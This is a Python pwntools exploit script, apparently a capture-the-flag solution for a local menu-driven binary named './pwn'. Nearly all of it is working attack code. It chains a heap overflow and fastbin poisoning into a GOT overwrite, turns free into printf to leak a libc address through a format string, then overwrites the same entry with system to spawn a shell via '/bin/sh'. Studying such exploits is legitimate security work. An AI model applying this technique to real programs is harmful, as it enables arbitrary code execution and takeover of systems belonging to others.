#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
from time import sleep
context.log_level = "critical"
context.binary = "./pwn"
elf = context.binary
libc = elf.libc

def show():
    io.sendlineafter(":", "1")

def add(length, name):
    io.sendlineafter(":", "2")
    io.sendlineafter(":", str(length))
    io.sendafter(":", name)
    sleep(0.01)

def edit(idx, length, name):
    io.sendlineafter(":", "3")
    io.sendlineafter(":", str(idx))
    io.sendlineafter(":", str(length))
    io.sendafter(":", name)
    sleep(0.01)

def delete(idx):
    io.sendlineafter(":", "4")
    io.sendlineafter(":", str(idx))



io = process("./pwn")

add(0x10, '0' * 0x10)
add(0x50, '1' * 0x50)
add(0x10, ".%17$p.")
add(0x10, "/bin/sh\0")

delete(1)
edit(0, 0x30, flat('0' * 0x10, 0, 0x61, 0x601ffa))

add(0x50, '4' * 0x50)
add(0x50, flat('\0' * 0xe, flat(elf.sym["printf"])[: 6]))
delete(2)

io.recvuntil(".")
libc.address = int(io.recvuntil(".", drop = True), 16) - 0x20830
print("libc @ {:#x}".format(libc.address))

edit(4, 0x20, flat('\0' * 0xe, flat(libc.sym["system"])[: 6]))
delete(3)


io.interactive()
